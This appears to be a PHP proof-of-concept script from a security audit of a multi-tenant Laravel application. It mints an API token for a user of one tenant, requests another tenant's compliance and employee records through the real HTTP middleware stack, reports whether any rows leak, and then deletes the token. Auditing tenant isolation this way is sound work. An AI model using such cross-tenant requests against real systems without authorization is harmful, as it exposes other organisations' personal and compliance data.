<?php
/**
 * The strongest form of the proof: dispatch through the REAL HTTP kernel, so
 * every middleware runs — web, auth, session, menu — exactly as a browser or
 * the Next.js frontend would hit it. Read only.
 */
DB::setDefaultConnection('mysql');
$db = DB::connection('mysql');

$attackerTenant = 1;
$victimTenant = 3;

$a = $db->table('tbluser')->where('sub_institute_id', $attackerTenant)
    ->whereNotNull('user_profile_id')->first(['id','first_name']);
$u = \App\Models\auth\tbluserModel::find($a->id);
$token = $u->createToken('route-level')->plainTextToken;

printf("Caller: user #%d of tenant %d, using a REAL token over the REAL route.\n", $a->id, $attackerTenant);
printf("Target: GET /settings/institute_detail?sub_institute_id=%d\n\n", $victimTenant);

$request = \Illuminate\Http\Request::create(
    '/settings/institute_detail', 'GET',
    [
        'type' => 'API',
        'token' => $token,
        'sub_institute_id' => $victimTenant,
        'syear' => date('Y'),
        'user_id' => $a->id,
        'formName' => 'compliance',
    ]
);
$request->headers->set('Accept', 'application/json');

$kernel = app(\Illuminate\Contracts\Http\Kernel::class);
$response = $kernel->handle($request);

$u->tokens()->where('name', 'route-level')->delete();

printf("HTTP %d  (middleware stack ran: web, auth, session, menu)\n", $response->getStatusCode());

$body = json_decode($response->getContent(), true);
$compliance = $body['complainceData'] ?? [];
$employees = $body['userDetails'] ?? [];

if (!is_array($compliance)) { $compliance = []; }
if (!is_array($employees)) { $employees = []; }

$tenants = collect($compliance)->pluck('sub_institute_id')->unique()->values()->all();

printf("compliance records: %d   from tenant(s): %s\n", count($compliance), implode(',', $tenants) ?: '-');
printf("employee records:   %d\n", count($employees));

$leaked = collect($compliance)->where('sub_institute_id', $victimTenant)->count();
printf("\nrows belonging to tenant %d (the one asked for): %d  -> %s\n",
    $victimTenant, $leaked, $leaked === 0 ? 'NO LEAK' : 'LEAK');
